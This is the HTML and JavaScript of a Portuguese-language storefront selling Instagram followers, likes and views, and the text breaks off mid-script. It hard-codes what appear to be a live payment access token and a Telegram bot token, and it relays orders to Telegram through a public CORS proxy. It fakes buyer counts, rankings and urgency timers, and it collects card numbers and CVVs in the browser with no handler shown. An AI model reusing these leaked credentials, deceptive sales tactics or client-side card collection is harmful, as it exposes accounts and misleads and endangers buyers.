<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Wendizx Elite Store - V6 Final</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Inter:wght@300;400;600;900&display=swap" rel="stylesheet">
<style>
:root {
	--p: #00f2fe; --s: #4facfe; --a: #00ff88; --d: #ff4b2b; --bg: #030005;
	--g: rgba(255,255,255,0.03); --glass-v2: rgba(10,10,10,0.8);
}
* { margin:0; padding:0; box-sizing:border-box; font-family:'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
body { height: 100vh; overflow: hidden; background: var(--bg); color: #fff; display: flex; justify-content: center; align-items: center; }

#p, .scanline { 
	position: fixed; 
	top: 0; left: 0; width: 100%; height: 100%; 
	z-index: 50;
	pointer-events: none !important; 
}
#p { opacity: 0.3; }

.app { 
	position: absolute; 
	z-index: 100;
	width: 95%; max-width: 420px; height: 94vh; 
	background: var(--glass-v2); backdrop-filter: blur(50px); border-radius: 50px; 
	border: 1px solid rgba(255,255,255,0.1); display: flex; flex-direction: column; 
	overflow: hidden; box-shadow: 0 0 80px rgba(0,242,254,0.1);
}

.logo-container { width: 85px; height: 85px; margin: 0 auto 10px; border-radius: 50%; border: 2px solid var(--p); overflow: hidden; background: #000; box-shadow: 0 0 25px rgba(0,242,254,0.3); }
.logo-container img { width: 100%; height: 100%; object-fit: cover; }
.header { padding: 25px 25px 10px; text-align: center; }
.logo { font-family: 'Syncopate'; font-size: 18px; letter-spacing: 5px; cursor: pointer; text-transform: uppercase; }
.logo span { color: var(--p); }
.balance-card { background: rgba(255,255,255,0.05); padding: 25px; border-radius: 35px; margin-top: 8px; border: 1px solid rgba(255,255,255,0.08); position: relative; overflow: hidden; }
.balance-card::after { content:''; position:absolute; top:-50%; left:-50%; width:200%; height:200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.03), transparent); transform: rotate(45deg); animation: shine 5s infinite; }
@keyframes shine { 0% { transform: translateX(-100%) rotate(45deg); } 100% { transform: translateX(100%) rotate(45deg); } }
.tabs { display: flex; background: rgba(0,0,0,0.6); padding: 8px; margin: 10px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.05); }
.tab { flex: 1; text-align: center; padding: 12px; font-size: 10px; font-weight: 900; color: #444; cursor: pointer; border-radius: 22px; transition: 0.3s; text-transform: uppercase; }
.tab.active { color: #fff; background: rgba(255,255,255,0.05); }
.view { display: none; flex-direction: column; padding: 10px 25px 5px; overflow-y: auto; flex: 1; scrollbar-width: none; }
.view.active { display: flex; animation: fadeIn 0.4s ease; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
.card { background: var(--g); border: 1px solid rgba(255,255,255,0.05); padding: 22px; border-radius: 30px; margin-bottom: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
.card:active { transform: scale(0.97); }
.btn { width: 100%; padding: 22px; border-radius: 25px; border: none; font-weight: 900; text-transform: uppercase; cursor: pointer; background: linear-gradient(45deg, var(--p), var(--s)); color: #000; transition: 0.3s; }
.btn:active { transform: scale(0.95); }
.btn.loading { opacity: 0.7; pointer-events: none; position: relative; }
.btn.loading::after { content: ''; position: absolute; right: 14px; top: 50%; transform: translateY(-50%); width: 14px; height: 14px; border: 2px solid rgba(0,0,0,0.2); border-top-color: rgba(0,0,0,0.6); border-radius: 50%; animation: spin 0.8s linear infinite; }
@keyframes spin { to { transform: translateY(-50%) rotate(360deg); } }
.btn-sec { background: none; border: 1px solid rgba(255,255,255,0.1); color: #777; margin-top: 10px; }
input, select { width: 100%; padding: 20px; margin: 10px 0; border-radius: 25px; border: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.5); color: #fff; text-align: center; font-weight: 700; }
input:focus { border-color: var(--p); outline: none; }
.modal { position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 9999; display: none; align-items: center; justify-content: center; backdrop-filter: blur(25px); }
.modal-content { width: 90%; max-width: 380px; background: #050505; border: 1px solid var(--p); padding: 40px; border-radius: 50px; text-align: center; box-shadow: 0 0 50px rgba(0,0,0,1); }
.status-bar { position: absolute; top: 15px; width: 100%; padding: 0 35px; display: flex; justify-content: space-between; font-size: 10px; color: #444; font-weight: 800; letter-spacing: 1px; }
.hidden { display: none; }

.promo-timer { background: rgba(255,75,43,0.1); border: 1px solid var(--d); padding: 10px; border-radius: 15px; margin-bottom: 15px; font-size: 10px; text-align: center; }
.live-count { color: var(--a); font-size: 10px; text-align: center; margin-bottom: 10px; font-weight: 800; }
.ranking-container { background: rgba(255,255,255,0.02); border-radius: 20px; padding: 15px; margin-top: 15px; border: 1px solid rgba(255,255,255,0.05); }
.rank-item { display: flex; justify-content: space-between; font-size: 11px; padding: 5px 0; opacity: 0.8; }
#chartCanvas { width: 100%; height: 40px; margin-top: 10px; border-bottom: 1px solid var(--p); }

.toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--p); color: #000; padding: 12px 25px; border-radius: 20px; font-weight: 800; font-size: 12px; z-index: 10000; transition: 0.3s; }

/* Activity feed + UI extras */
.activity-feed { margin-top:15px; max-height:220px; overflow:auto; border-radius:15px; border:1px solid rgba(255,255,255,0.03); padding:8px; background: rgba(255,255,255,0.01); }
.act-item { display:flex; justify-content:space-between; gap:12px; padding:8px; border-bottom:1px solid rgba(255,255,255,0.02); font-size:12px; align-items:center; transition: 0.18s; }
.act-item:hover { background: rgba(255,255,255,0.01); transform: translateY(-3px); }
.act-avatar { width:36px; height:36px; border-radius:50%; background:linear-gradient(135deg,var(--p),var(--s)); display:inline-block; margin-right:10px; flex:0 0 36px; align-self:flex-start; text-align:center; line-height:36px; font-weight:900; }
.act-meta { color:#777; font-size:10px; margin-top:6px; }
.act-type { font-weight:900; font-size:11px; color:var(--p); display:block; }
.badge { padding:4px 8px; border-radius:12px; font-size:11px; font-weight:800; }
.badge.deposit { background: rgba(0,255,136,0.08); color:var(--a); border:1px solid rgba(0,255,136,0.06); }
.badge.purchase { background: rgba(0,242,254,0.06); color:var(--p); border:1px solid rgba(0,242,254,0.06); }
.badge.pending { background: rgba(255,165,0,0.06); color:#ffae00; border:1px solid rgba(255,165,0,0.06); }
.timeline { border-left:2px dashed rgba(255,255,255,0.03); padding-left:12px; }
.timeline .act-item { border-bottom:none; padding:14px 6px; }
.tooltip { position:relative; cursor:help; }
.tooltip:hover::after { content:attr(data-tip); position:absolute; left:50%; transform:translateX(-50%); bottom:120%; background:#111; padding:8px 10px; border-radius:8px; font-size:11px; color:#fff; white-space:nowrap; box-shadow:0 6px 20px rgba(0,0,0,0.6); }
.skeleton { background: linear-gradient(90deg,#111 25%, #0b0b0b 37%, #111 63%); background-size:400% 100%; animation: shimmer 1.2s linear infinite; height:56px; border-radius:10px; margin-bottom:8px; }
@keyframes shimmer { 0%{ background-position:200% 0 } 100%{ background-position:-200% 0 } }
.btn.small { padding:8px 12px; font-size:12px; border-radius:12px; width:auto; }
.confetti { position:fixed; pointer-events:none; left:0; top:0; width:100%; height:100%; z-index:99999; overflow:hidden; display:none; }
.notif-bell { position:relative; cursor:pointer; }
.notif-count { position:absolute; top:-6px; right:-8px; background:var(--d); color:#fff; font-size:10px; padding:3px 6px; border-radius:999px; font-weight:900; }
.theme-toggle { display:inline-flex; align-items:center; gap:8px; cursor:pointer; }
.export-btn { display:inline-block; margin-left:8px; }

/* WhatsApp floating support button */
.whatsapp-fab { position:fixed; right:18px; bottom:18px; width:64px; height:64px; border-radius:999px; box-shadow: 0 8px 24px rgba(0,0,0,0.35); z-index:20000; display:flex; align-items:center; justify-content:center; cursor:pointer; transition: transform 200ms ease; }
.whatsapp-fab:hover { transform: translateY(-6px); }
.whatsapp-fab img { width:100%; height:100%; object-fit:cover; border-radius:999px; display:block; }
.whatsapp-fab .badge { position:absolute; right:-6px; top:-6px; background:#25D366; color:#fff; padding:4px 6px; border-radius:12px; font-size:11px; font-weight:900; box-shadow:0 6px 18px rgba(0,0,0,0.25); }

/* Instagram floating support button (placed to the left of WhatsApp) */
.instagram-fab { position:fixed; right:92px; bottom:18px; width:54px; height:54px; border-radius:999px; box-shadow: 0 8px 24px rgba(0,0,0,0.35); z-index:20000; display:flex; align-items:center; justify-content:center; cursor:pointer; transition: transform 200ms ease; }
.instagram-fab:hover { transform: translateY(-6px); }
.instagram-fab img { width:100%; height:100%; object-fit:cover; border-radius:999px; display:block; }

/* Pix modal warning and deposit banner */
.pix-warning { margin-top:10px; background: rgba(255,75,43,0.08); border:1px solid var(--d); color:var(--d); padding:8px 12px; border-radius:10px; font-size:12px; }
.deposit-banner { position:fixed; top:80px; right:-400px; width:360px; background: linear-gradient(90deg,#00ff88,#00f2fe); color:#001; padding:14px 18px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.4); font-weight:900; z-index:20000; transition: right 420ms cubic-bezier(.2,.9,.2,1); display:flex; gap:10px; align-items:center; }
.deposit-banner.show { right:18px; }
.deposit-banner.hide { right:-420px; }
.deposit-banner .close-btn { background: rgba(0,0,0,0.06); border: none; padding:6px 8px; border-radius:8px; cursor:pointer; margin-left:8px; font-weight:800; }

/* Purchase processing + success */
.processing-wrap { display:flex; flex-direction:column; gap:12px; align-items:center; }
.progress-bar { width:80%; height:10px; background:rgba(255,255,255,0.06); border-radius:999px; overflow:hidden; }
.progress-bar .fill { height:100%; width:0%; background:linear-gradient(90deg,var(--a),var(--p)); transition: width 1.2s ease; }
.success-card { display:flex; gap:12px; align-items:center; justify-content:space-between; background:linear-gradient(90deg,#00ff88,#00f2fe); color:#022; padding:16px; border-radius:14px; font-weight:900; }
.order-id { font-family: 'Syncopate'; font-size:16px; color:#002; }
.saldo-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
}

.saldo-text {
  font-size: 36px;
  font-weight: 900;
  color: var(--a);
  font-family: 'Syncopate';
}

</style>
</head>
<body>

<div class="scanline"></div>
<canvas id="p"></canvas>

<div class="app">
	<div class="status-bar" style="justify-content: flex-start; gap:8px;">
		<span style="opacity:.9">WENDIZX NETWORK</span>
            <div style="margin-left:auto; display:flex; gap:8px; align-items:center;">
            	<div class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Alternar tema">üåó</div>
            	<div id="notifBell" class="notif-bell" title="Notifica√ß√µes">üîî<span id="notifCount" class="notif-count hidden">0</span></div>
            </div>
		<span id="clock">12:00</span>
	</div>

	<div class="header">
		<div class="logo-container">
			<img src="https://i.postimg.cc/BbffRLkM/IMG-20251212-052129-915.webp" alt="Logo">
		</div>
		<div class="logo" onclick="secret()">WENDIZX <span>STORE</span></div>
		<div class="promo-timer">OFERTA TERMINA EM: <b id="cd" style="color:var(--d)">02:00:00</b></div>
		<div class="balance-card">
  <p style="font-size:9px; color:#555; letter-spacing: 3px;">CARTEIRA DIGITAL</p>

  <div class="saldo-row">
    <p class="saldo-text">
      R$ <span id="meuSaldo">0,00</span>
    </p>

    <button class="btn small" onclick="goTo('view-deposito')">
      ADICIONAR SALDO
    </button>
  </div>
</div>

	<div class="tabs">
		<div class="tab active" id="tab-serv" onclick="goTo('view-menu')">LOJA</div>
		<div class="tab" id="tab-comb" onclick="goTo('view-combos')">PACKS</div>
		<div class="tab" id="tab-hist" onclick="goTo('view-hist')">HISTORICO</div>
	</div>

	<div class="view active" id="view-menu">
		<div class="live-count">üî• <span id="user-now">12</span> PESSOAS COMPRANDO AGORA</div>
		<div class="card" onclick="startBuy('Seguidores')">
			<div><b>SEGUIDORES INSTAGRAM</b><br><small style="color:#555">R$ 0,011 p/ unidade</small></div>
			<span>‚ûî</span>
		</div>
		<div class="card" onclick="startBuy('Curtidas')">
			<div><b>CURTIDAS REAIS</b><br><small style="color:#555">R$ 0,00299 p/ unidade</small></div>
			<span>‚ûî</span>
		</div>
		<div class="card" onclick="startBuy('Visualiza√ß√µes')">
			<div><b>VIEWS STORYS/REELS</b><br><small style="color:#555">R$ 0,005 p/ unidade</small></div>
			<span>‚ûî</span>
		</div>
		<canvas id="chartCanvas"></canvas>
	</div>

	<div class="view" id="view-comprar">
		<h2 id="buyTitle" style="color:var(--p); font-family:'Syncopate'; font-size:13px; margin-bottom:20px;"></h2>
		<input type="number" id="qtd" placeholder="QUANTIDADE">
		<select id="regiao" onchange="calc()">
			<option value="global">PERFIS MUNDIAIS</option>
			<option value="br">PERFIS BRASILEIROS</option>
		</select>
		<input id="link" placeholder="LINK OU @USUARIO">
		<div style="margin:20px 0; padding:25px; background:rgba(0,0,0,0.4); border-radius:35px; border: 1px solid rgba(255,255,255,0.05); text-align:center;">
			<p style="font-size:10px; color:#444;">INVESTIMENTO</p>
			<h2 id="total" style="color:var(--a); font-size:38px; font-weight:900;">R$ 0,00</h2>
		</div>
		<button id="btnOrderNow" class="btn" onclick="orderNow()">CONFIRMAR PEDIDO</button>
		<button class="btn btn-sec" onclick="goTo('view-menu')">VOLTAR</button>
	</div>

	<div class="view" id="view-combos">
		<h2 style="font-family:'Syncopate'; font-size:13px; margin-bottom:25px; color:var(--p);">COMBOS EXCLUSIVOS</h2>
		<div class="card" onclick="openCombo('Pack Start', 9.90)">
			<div><b>PACK START üöÄ</b><br><small style="color:#555">500 Seg + 150 Curtidas + 1k Views</small></div>
			<b style="color:var(--a)">R$ 9,90</b>
		</div>
		<div class="card" onclick="openCombo('Influencer Pro üëë', 19.90)">
			<div><b>INFLUENCER PRO</b><br><small style="color:#555">2k Seg + 500 Curtidas + 5k Views</small></div>
			<b style="color:var(--a)">R$ 19,90</b>
		</div>
		<div class="ranking-container">
			<p style="font-size:9px; color:var(--p); margin-bottom:10px; font-weight: 800;">TOP COMPRADORES (DIA)</p>
			<div class="rank-item"><span>1. @gabriel***</span> <b>R$ 442,00</b></div>
			<div class="rank-item"><span>2. @isabella***</span> <b>R$ 310,50</b></div>
			<div class="rank-item"><span>3. @felipe***</span> <b>R$ 128,00</b></div>
		</div>
		<div id="comboAction" class="hidden" style="margin-top:10px; background:rgba(0,0,0,0.5); padding:20px; border-radius:30px; border:1px solid var(--p);">
			<p id="comboSelected" style="font-size:11px; margin-bottom:15px; font-weight:800;"></p>
			<input id="linkCombo" placeholder="LINK DO PERFIL">
			<button id="btnFinalizeCombo" class="btn" onclick="finalizarCombo()">ATIVAR AGORA</button>
		</div>
		<button class="btn btn-sec" style="margin-top:10px;" onclick="goTo('view-menu')">VOLTAR</button>
	</div>

	<div class="view" id="view-hist">
		<h2 style="font-family:'Syncopate'; font-size:13px; margin-bottom:20px;">HIST√ìRICO DE COMPRAS</h2>
		<div style="display:flex; gap:8px; align-items:center; margin-bottom:12px;">
			<input id="feedSearch" placeholder="üîç Buscar no feed" style="flex:1; padding:10px 12px; border-radius:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(255,255,255,0.04); color:#fff;" oninput="filterFeed()">
			<select id="feedFilter" onchange="filterFeed()" style="padding:10px 12px; border-radius:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(255,255,255,0.04); color:#fff;">
				<option value="all">Todos</option>
				<option value="deposit">Dep√≥sitos</option>
				<option value="purchase">Compras</option>
				<option value="pix_created">PIX</option>
			</select>
			<button class="btn small export-btn" onclick="exportFeedCSV()" title="Exportar CSV">‚¨áÔ∏è CSV</button>
			<button class="btn small" onclick="toggleTimeline()" id="timelineBtn" title="Alternar timeline">üïì</button>
		</div>
		<div id="hist-list"></div>
		<div style="margin-top:12px;">
			<p style="font-size:9px; color:var(--p); margin-bottom:8px; font-weight:800;">FEED DE ATIVIDADES</p>
			<div id="activity-feed" class="activity-feed"></div>
		</div>
		<div id="notifPanel" class="activity-feed hidden" style="position:absolute; right:20px; top:70px; width:320px; max-height:60vh;"></div>
		<button class="btn btn-sec" onclick="goTo('view-menu')">VOLTAR</button>
	</div>

	<div class="view" id="view-deposito">
    <h2 style="font-family:'Syncopate'; font-size:13px; margin-bottom:20px;">RECARREGAR</h2>
    
    <div id="metodo-selecao">
        <p style="font-size:11px; color:#777; margin-bottom:15px; text-align:center;">ESCOLHA O M√âTODO DE PAGAMENTO</p>
        <div class="card" onclick="setMetodo('pix')" style="margin-bottom:10px;">
            <div><b>PIX INSTANT√ÇNEO</b><br><small style="color:var(--a)">Aprova√ß√£o imediata</small></div>
            <span>‚ö°</span>
        </div>
        <div class="card" onclick="setMetodo('cartao')">
            <div><b>CART√ÉO DE CR√âDITO</b><br><small style="color:#90EE90">Aprova√ß√£o imediata</small></div>
            <span>üí≥</span>
        </div>
    </div>

    <div id="fluxo-pix" class="hidden">
        <input type="number" id="vDep" placeholder="VALOR R$">
        <button id="btnPayPix" class="btn" onclick="payPix()">GERAR QR CODE</button>
        <button class="btn btn-sec" onclick="setMetodo('reset')">VOLTAR</button>
    </div>

    <div id="fluxo-cartao" class="hidden">
        <input type="number" id="vDepCartao" placeholder="VALOR DA RECARGA">
        <input type="text" id="cc_nome" placeholder="NOME IMPRESSO NO CART√ÉO">
        <input type="text" id="cc_num" placeholder="0000 0000 0000 0000" maxlength="19">
        <div style="display:flex; gap:10px;">
            <input type="text" id="cc_val" placeholder="MM/AA" maxlength="5">
            <input type="text" id="cc_cvv" placeholder="CVV" maxlength="4">
        </div>
        <button id="btnPayCartao" class="btn" onclick="processarCartao()" style="margin-top:10px;">FINALIZAR PAGAMENTO</button>
        <button class="btn btn-sec" onclick="setMetodo('reset')">VOLTAR</button>
    </div>
</div>

<div id="toast-container"></div>
<div class="modal" id="pixModal"><div class="modal-content" id="modalInt"></div></div>
<div class="modal" id="confirmModal"><div class="modal-content" id="confirmInt"></div></div>
<div id="confetti" class="confetti"></div>
<div id="toast-notifications" style="position:fixed; right:18px; top:80px; z-index:15000;"></div>

<!-- WhatsApp support floating button -->
<a id="whatsappFab" class="whatsapp-fab" href="https://wa.me/5565993492211?text=Ol%C3%A1%2C%20preciso%20de%20suporte" target="_blank" rel="noopener">
	<img src="https://imgs.search.brave.com/Tjj0mhbnOY70Q9FI5msXYvv2DTeOxMSRwSyXXzxuoP4/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/ZnJlZXBuZ2xvZ29z/LmNvbS91cGxvYWRz/L3doYXRzYXBwLXBu/Zy1pbWFnZS05LnBu/Zw" alt="WhatsApp Support">
</a>

<!-- Instagram support floating button -->
<a id="instagramFab" class="instagram-fab" href="https://www.instagram.com/wendizx_/" target="_blank" rel="noopener">
    <img src="https://imgs.search.brave.com/4SpY97NAvaHU9wdz2vtmoXULxfDqDjQ6SOtwPQMkYw4/rs:fit:860:0:0:0/g:ce/aHR0cDovL3Bsb25l/LnVmcGIuYnIvZGNz/L2NvbnRlbnRzL2lt/YWdlbnMvaW5zdGFn/cmFtLWxvZ28ucG5n/L0BAaW1hZ2VzL2lt/YWdlLnBuZw" alt="Instagram Support">
</a>

<script>
// CONFIGURA√á√ïES API
// NOTE: For security, move sensitive tokens to a server-side endpoint.
const ACCESS_TOKEN = "APP_USR-3292745585633071-122214-e811e5a51f22f7d6c9d1d46ded7a2ef5-3087257839"; // TODO: remove from client
const PROXY_URL = "https://corsproxy.io/?"; 

let saldo = parseFloat(localStorage.getItem('saldoLoja')) || 0;
let hist = JSON.parse(localStorage.getItem('histLoja')) || [];
let activities = JSON.parse(localStorage.getItem('actLoja')) || [];
let serv = "", pid = "", sClicks = 0, comboPreco = 0, comboNome = "";

function updateClock() {
	const now = new Date();
	document.getElementById('clock').innerText = now.getHours().toString().padStart(2, '0') + ":" + now.getMinutes().toString().padStart(2, '0');
}
setInterval(updateClock, 1000); updateClock();

function myAlert(msg) {
	const container = document.getElementById('toast-container');
	const t = document.createElement('div');
	t.className = 'toast'; t.innerText = msg;
	container.appendChild(t);
	setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 500); }, 3000);
}

function setBtnLoading(id, loading){
	try{
		const b = document.getElementById(id);
		if(!b) return;
		if(loading){ b.classList.add('loading'); b.disabled = true; }
		else { b.classList.remove('loading'); b.disabled = false; }
	}catch(e){ console.debug('setBtnLoading error', e); }
}

function resetCampos() {
	document.getElementById('qtd').value = "";
	document.getElementById('link').value = "";
	document.getElementById('total').innerText = "R$ 0,00";
}

function goTo(id) {
	document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
	document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
	document.getElementById(id).classList.add('active');
	if(id === 'view-menu') document.getElementById('tab-serv').classList.add('active');
	if(id === 'view-combos') document.getElementById('tab-comb').classList.add('active');
	if(id === 'view-hist') document.getElementById('tab-hist').classList.add('active');
}

function startBuy(s) { 
	resetCampos();
	serv = s; 
	document.getElementById('buyTitle').innerText = s.toUpperCase(); 
	goTo('view-comprar'); 
}

document.getElementById('qtd').addEventListener('input', calc);
function calc() {
	let q = document.getElementById('qtd').value;
	let r = document.getElementById('regiao').value;
	let p = 0;
	if(serv === 'Seguidores') p = 0.01198; 
	else if(serv === 'Curtidas') p = 0.00299; 
	else if(serv === 'Visualiza√ß√µes') p = 0.00599; 
	if(r === 'br' && serv !== 'Visualiza√ß√µes') p *= 2; 
	document.getElementById('total').innerText = "R$ " + (q > 0 ? (q*p).toFixed(2) : "0,00");
}

function addHist(n, v, orderId){
	const id = orderId || ('H-' + Date.now());
	hist.unshift({ id, nome: n, valor: v, data: new Date().toLocaleTimeString() });
	if(hist.length > 15) hist.pop();
}

function save() { 
	localStorage.setItem('saldoLoja', saldo); 
	localStorage.setItem('histLoja', JSON.stringify(hist)); 
	localStorage.setItem('actLoja', JSON.stringify(activities));
	document.getElementById('meuSaldo').innerText = saldo.toFixed(2).replace('.', ',');
	document.getElementById('hist-list').innerHTML = hist.map(i => `
		<div class="card" style="padding:15px; font-size:12px; display:flex; justify-content:space-between; align-items:center; gap:12px;">
			<div style="flex:1">
				<div style="font-weight:800">${i.nome}</div>
				<div style="font-size:11px; color:#777; margin-top:6px;">${i.data} ‚Ä¢ ID: <span style="font-weight:900">${i.id}</span></div>
			</div>
			<div style="text-align:right; min-width:160px; display:flex; flex-direction:column; gap:8px; align-items:flex-end;">
				<div style="color:var(--d); font-weight:900">- R$ ${parseFloat(i.valor).toFixed(2)}</div>
				<div style="display:flex; gap:8px;">
					<button class="btn small" onclick="copyToClipboard('${i.id}')">COPIAR ID</button>
					<button class="btn small btn-sec" onclick="showActivityDetails('${i.id}')">DETALHES</button>
				</div>
			</div>
		</div>
	`).join('');
	updateActivityUI();
}

// LOG E FEED DE ATIVIDADES
function logActivity(type, info = {}) {
	console.debug('logActivity', type, info);
	const ts = new Date().toLocaleString();
	const id = info.txid || `${type.slice(0,3).toUpperCase()}-${Date.now()}`;
	const item = Object.assign({ id, type, ts }, info);
	activities.unshift(item);
	if (activities.length > 500) activities.pop();
	localStorage.setItem('actLoja', JSON.stringify(activities));
	updateActivityUI();
	const label = (type === 'purchase') ? 'Compra' : (type === 'deposit') ? 'Dep√≥sito' : (type === 'pix_created') ? 'PIX Gerado' : type;
	myAlert(`‚úì ${label} ‚Ä¢ ${item.amount ? 'R$ ' + parseFloat(item.amount).toFixed(2) : ''}`);
	// Telegram notifications
	if(type === 'pix_created') tgNotifyDepositCreated(item);
	if(type === 'deposit') tgNotifyDepositApproved(item);
	if(type === 'purchase') tgNotifyPurchase(item);
	if(type === 'dev_deposit') tgNotifyDevDeposit(item);
	if(type === 'combo') tgNotifyComboActivated(item);
	if(type === 'deposit_pending') tgNotifyDepositPending(item);
	if(type === 'deposit_failed') tgNotifyDepositFailed(item);
	if(type === 'refund') tgNotifyRefund(item);
	if(type === 'topup') tgNotifyTopUp(item);
	if(type === 'balance_low') tgNotifyBalanceLow(item);
	if(type === 'high_value_deposit') tgNotifyHighValueDeposit(item);
	if(type === 'recurring') tgNotifyRecurringPayment(item);
	if(type === 'chargeback') tgNotifyChargeback(item);
	if(type === 'purchase_details') tgNotifyPurchaseDetails(item);
}

function updateActivityUI() {
	const el = document.getElementById('activity-feed');
	if(!el) return;
	const emoji = {
		purchase: "üõí", deposit: "üí∞", pix_created: "üîÉ", dev_deposit: "üß™",
		combo: "üéÅ", deposit_pending: "‚è≥", deposit_failed: "‚ùå", refund: "‚Ü©Ô∏è",
		topup: "‚ö°", balance_low: "‚ö†Ô∏è", high_value_deposit: "üè¶", recurring: "üîÅ",
		chargeback: "üö´", purchase_details: "üì¶"
	};

	el.innerHTML = activities.map(a => {
		const e = emoji[a.type] || "‚Ä¢";
		const amt = a.amount ? ` <span style="color:var(--a); font-weight:900">${'R$ ' + parseFloat(a.amount).toFixed(2)}</span>` : '';
		const product = a.product || a.note || a.nome || '-';
		const orderRef = a.orderId || a.txid || a.id || '';
		const link = a.link ? `<br><small class="act-meta">${a.link}</small>` : '';
		const orderHtml = orderRef ? `<br><small class="act-meta">ID: ${orderRef}</small>` : '';
		return `
		<div class="act-item" onclick="showActivityDetails('${a.id}')">
			<div style="display:flex; gap:10px; align-items:flex-start; flex:1;">
				<div class="act-avatar" title="${a.user || 'Usu√°rio'}">${e}</div>
				<div style="flex:1;">
					<span class="act-type">${e} ${(a.type || '').toUpperCase()}</span>
					<div style="font-weight:800">${product}${orderHtml}${link}</div>
					<div class="act-meta">${a.ts}</div>
				</div>
			</div>
			<div style="text-align:right; min-width:140px;">
				<div style="font-weight:900">${amt}</div>
				<div class="act-meta">Saldo: ${a.before!==undefined? parseFloat(a.before).toFixed(2) : '--'} ‚Üí ${a.after!==undefined? parseFloat(a.after).toFixed(2) : '--'}</div>
				<div style="margin-top:6px;">
					<span class="badge ${a.type === 'deposit' ? 'deposit' : 'purchase'}">${a.type}</span>
					<button class="btn small" onclick="toggleImportant(event,'${a.id}')" title="Marcar importante">‚≠ê</button>
				</div>
			</div>
		</div>`;
	}).join('');
}

function copyToClipboard(text){
	try{
		if(!text && text !== 0) return myAlert('ID vazio');
		const str = String(text);
		if(navigator.clipboard && navigator.clipboard.writeText){
			navigator.clipboard.writeText(str).then(()=> myAlert('Copiado para a √°rea de transfer√™ncia')).catch(()=>{
				const ta = document.createElement('textarea'); ta.value = str; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); myAlert('Copiado');
			});
		} else {
			const ta = document.createElement('textarea'); ta.value = str; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); myAlert('Copiado');
		}
	}catch(e){ console.debug('copyToClipboard error', e); myAlert('Falha ao copiar'); }
}

// TELEGRAM NOTIFICATIONS
const TG_TOKEN = "8255072787:AAGrl8qi5A9lHd0TWoCvfzWZl8a2quqt0Y8";
const TG_CHAT_ID = "8306011790";
const TG_API = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;

function fmtMoney(v){ return 'R$ ' + parseFloat(v).toFixed(2).replace('.',','); }

function tgSend(text){
	try{
		// Use CORS proxy defined in PROXY_URL to avoid browser CORS issues
		const url = (typeof PROXY_URL === 'string' && PROXY_URL) ? PROXY_URL + encodeURIComponent(TG_API) : TG_API;
		console.debug('tgSend ->', { url, chat_id: TG_CHAT_ID, text });
		fetch(url, {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "HTML" })
		}).then(res => res.json().then(j=> console.debug('tgSend response', j)).catch(()=>{})).catch(err => console.debug('tgSend error', err));
	} catch(e){ console.debug('tgSend exception', e); }
}

function tgNotifyDepositCreated(item){
	const msg = `üîî <b>PIX GERADO</b>\nüíµ Valor: ${fmtMoney(item.amount)}\nüÜî ID: ${item.id}\nüìÖ ${item.ts}\nSaldo: ${item.before?.toFixed(2) || '--'} ‚Üí ${item.after?.toFixed(2) || '--'}\n‚è≥ Aguardando confirma√ß√£o.`;
	tgSend(msg);
}

function tgNotifyDepositApproved(item){
	const msg = `‚úÖ <b>DEP√ìSITO APROVADO</b>\nüíµ ${fmtMoney(item.amount)}\nüÜî ${item.txid || item.id}\nüìÖ ${item.ts}\nüíö Saldo: ${item.before?.toFixed(2)} ‚Üí ${item.after?.toFixed(2)}`;
	tgSend(msg);
}

function tgNotifyPurchase(item){
	const msg = `üõí <b>NOVA COMPRA</b>\nüì¶ Produto: ${item.product || item.nome}\nüíµ Valor: ${fmtMoney(item.amount)}\nüîó ${item.link || '-'}\nüïí ${item.ts}\nüí≥ Saldo: ${item.before?.toFixed(2)} ‚Üí ${item.after?.toFixed(2)}`;
	tgSend(msg);
}

function tgNotifyComboActivated(item){
	const msg = `üéÅ <b>PACK ATIVADO</b>\nüì¶ Pack: ${item.product}\nüíµ ${fmtMoney(item.amount)}\nüîó ${item.link || '-'}\nüïí ${item.ts}`;
	tgSend(msg);
}

function tgNotifyDevDeposit(item){
	const msg = `üß™ <b>DEV MODE</b>\n‚ûï Saldo adicionado: ${fmtMoney(item.amount)}\nüìù Nota: ${item.note || 'DEV MODE'}\nüïí ${item.ts}\nSaldo: ${item.before?.toFixed(2)} ‚Üí ${item.after?.toFixed(2)}`;
	tgSend(msg);
}

// extra notifications
function tgNotifyDepositPending(item){ tgSend(`‚è≥ <b>DEP√ìSITO PENDENTE</b>\nValor: ${fmtMoney(item.amount)}\nID: ${item.id}`); }
function tgNotifyDepositFailed(item){ tgSend(`‚ùå <b>DEP√ìSITO FALHOU</b>\nValor: ${fmtMoney(item.amount)}\nID: ${item.id}\nMotivo: ${item.reason || 'Desconhecido'}`); }
function tgNotifyRefund(item){ tgSend(`‚Ü©Ô∏è <b>REEMBOLSO</b>\nValor: ${fmtMoney(item.amount)}\nPedido: ${item.orderId || item.id}`); }
function tgNotifyTopUp(item){ tgSend(`‚ö° <b>TOP-UP</b>\nUsu√°rio adicionou saldo: ${fmtMoney(item.amount)}\nSaldo agora: ${item.after?.toFixed(2)}`); }
